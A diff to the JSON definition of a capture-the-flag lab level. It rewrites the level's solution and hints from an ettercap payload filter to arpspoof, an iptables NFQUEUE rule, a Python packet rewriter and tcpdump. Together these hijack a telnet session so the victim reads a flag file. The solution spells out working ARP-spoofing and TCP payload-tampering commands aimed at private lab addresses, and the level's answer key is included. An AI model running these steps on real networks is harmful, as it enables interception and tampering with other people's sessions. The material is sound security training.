@@ -80,33 +80,27 @@
       "minimal_possible_solve_time": 8,
       "answer": null,
       "answer_variable_name": "flag",
-      "content": "You captured the password but you cannot use it — `telnet 192.168.25.10` from your machine gets dropped at vm1's firewall.\n\nWhat you can do: vm2's session is more interesting than you might think. Look at the captured stream again — vm2 lists the home directory, then reads a specific file. With the right `ettercap` filter you can substitute a filename in vm2's command mid-stream so vm1 reads a *different* file under vm2's authenticated session. The response flows back through you.\n\nThe `ls` in vm2's session tells you exactly what alternative filename is available. Submit the file contents verbatim.",
-      "solution": "1. **Write the filter.** Save the following as `modify.ef` on vma:\n\n   ```\n   if (ip.proto == TCP && tcp.dst == 23) {\n       if (search(DATA.data, \"bait.txt\")) {\n           replace(\"bait.txt\", \"flag.txt\");\n           msg(\"replaced bait.txt with flag.txt\\n\");\n       }\n   }\n   ```\n\n   The strings are deliberately the same length so the TCP payload stays the same size and TCP sequence numbers don't drift.\n\n2. **Compile it:**\n\n   `etterfilter modify.ef -o modify.ecf`\n\n3. **Stop the standalone arpspoof processes** if they are still running — ettercap will do its own ARP MITM. Then start ettercap with the filter and ARP MITM in one shot:\n\n   `sudo ettercap -T -q -i eth1 -F modify.ecf -M arp:remote /192.168.25.10// /192.168.25.20//`\n\n   The two `///` syntax tells ettercap the two endpoints. `-T -q` keeps the output terse. `-M arp:remote` is the bidirectional ARP MITM, equivalent to your two arpspoof terminals from level 2.\n\n4. **Wait for the next vm2 cycle** (≤30 s). When the message `replaced bait.txt with flag.txt` appears in ettercap's terminal, the filter just fired. vm1 will execute the modified command and the flag will flow back through you. Ettercap prints intercepted data; the flag will appear as the response to the modified `cat`.\n\n5. Read the flag and submit it as **`${ANSWER}`**.",
+      "content": "You captured the password but you cannot use it — `telnet 192.168.25.10` from your machine gets dropped at vm1's firewall.\n\nWhat you can do: vm2's session is more interesting than you might think. Look at the captured stream again — vm2 lists the home directory, then reads a specific file. If you can substitute a filename in vm2's command mid-stream, vm1 will read a *different* file under vm2's authenticated session and the response flows back through you.\n\nThe `ls` in vm2's session tells you exactly what alternative filename is available. The mechanic is a payload rewrite on the FORWARD path. Submit the file contents verbatim.",
+      "solution": "Ettercap's `arp:remote` MITM is unreliable on this lab; we'll use `arpspoof` for the man-in-the-middle and a small Python script reading from `NFQUEUE` for the actual byte rewrite. A ready-to-run script is pre-installed at `/usr/local/sbin/mitm-rewrite.py` — it replaces `bait.txt` with `flag.txt` (same length, so TCP sequence numbers stay valid) in any packet that crosses the FORWARD chain.\n\n1. **Keep the ARP MITM you set up in level 2.** Both arpspoof processes should still be running. If not:\n\n   `sudo sysctl -w net.ipv4.ip_forward=1`\n\n   `sudo sysctl -w net.ipv4.conf.all.send_redirects=0`\n\n   `sudo arpspoof -i eth1 -t 192.168.25.10 192.168.25.20 &`\n\n   `sudo arpspoof -i eth1 -t 192.168.25.20 192.168.25.10 &`\n\n2. **Send tcp/23 forward traffic to NFQUEUE:**\n\n   `sudo iptables -I FORWARD -p tcp --dport 23 -j NFQUEUE --queue-num 1`\n\n3. **Start the rewriter** (one terminal, leave running):\n\n   `sudo python3 /usr/local/sbin/mitm-rewrite.py`\n\n   It prints a line each time it fires a rewrite.\n\n4. **Watch the response stream** for the file vm1 returns. In another terminal:\n\n   `sudo tcpdump -ni eth1 -A 'tcp port 23 and src host 192.168.25.10'`\n\n5. **Wait ≤30 s** for vm2's next cycle. When the script logs `[+] rewrote bait.txt -> flag.txt`, vm1 has just run the rewritten `cat` under vm2's session. The response (the flag contents) flows back through you. Read it from the tcpdump output.\n\n6. Submit the flag as **`${ANSWER}`**.\n\nWhen done, clean up: `sudo iptables -D FORWARD -p tcp --dport 23 -j NFQUEUE --queue-num 1` and Ctrl+C the rewriter and arpspoof terminals.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Filter language docs",
-          "content": "Ettercap's filter syntax is documented in `man etterfilter`. The two functions you need are `search(DATA.data, \"x\")` (returns true if the payload contains the string) and `replace(\"x\", \"y\")` (substitutes inside the current packet). Both work on the current packet's payload only.",
+          "title": "How the rewriter sees the traffic",
+          "content": "The script reads packets from kernel NFQUEUE — packets are diverted there by your iptables rule on the FORWARD chain. Because the kernel forwards (you set `ip_forward=1` for the MITM), forwarded packets pass through FORWARD before going out the other side. The script reads, optionally modifies, then accepts.",
           "hint_penalty": 10,
           "order": 0
         },
         {
-          "title": "Compile before loading",
-          "content": "Ettercap loads compiled `.ecf` files, not raw `.ef` source. `etterfilter input.ef -o output.ecf` does the compile. If the syntax is wrong, etterfilter will tell you the line number.",
+          "title": "Same-length swap",
+          "content": "The script's `OLD` and `NEW` strings have to be the same length (both `bait.txt` and `flag.txt` are 8 bytes). Different lengths would force a TCP sequence-number rewrite that breaks the session.",
           "hint_penalty": 15,
           "order": 1
         },
         {
-          "title": "Keep the lengths equal",
-          "content": "TCP cares about payload lengths. Replacing a string with one of a different length forces ettercap to rewrite TCP sequence numbers, which often breaks the session. Keep the two strings the same length (both `bait.txt` and `flag.txt` are 8 bytes) and you avoid the problem entirely.",
+          "title": "Where the flag shows up",
+          "content": "When the rewriter fires and vm1 runs the modified `cat`, the file contents flow back to vm2 across your wire. Run tcpdump in parallel to see only vm1's responses: `sudo tcpdump -ni eth1 -A 'tcp port 23 and src host 192.168.25.10'`. The flag is in vm1's response payload right after the modified command.",
           "hint_penalty": 20,
           "order": 2
-        },
-        {
-          "title": "Where the flag shows up",
-          "content": "When the filter fires and vm1 runs the rewritten `cat` command, the file contents go back to vm2 across your wire. That response is what ettercap prints. If you cannot find it in ettercap's stream, run tcpdump in parallel: `sudo tcpdump -ni eth1 -A 'tcp port 23 and src 192.168.25.10'` will show vm1's responses only.",
-          "hint_penalty": 25,
-          "order": 3
         }
       ],
       "incorrect_answer_limit": 10,
@@ -120,8 +114,8 @@
         {"technique_key": "TA0010.T1041"}
       ],
       "expected_commands": [
-        "ettercap",
-        "etterfilter",
+        "iptables",
+        "python3",
         "tcpdump"
       ],
       "commands_required": false
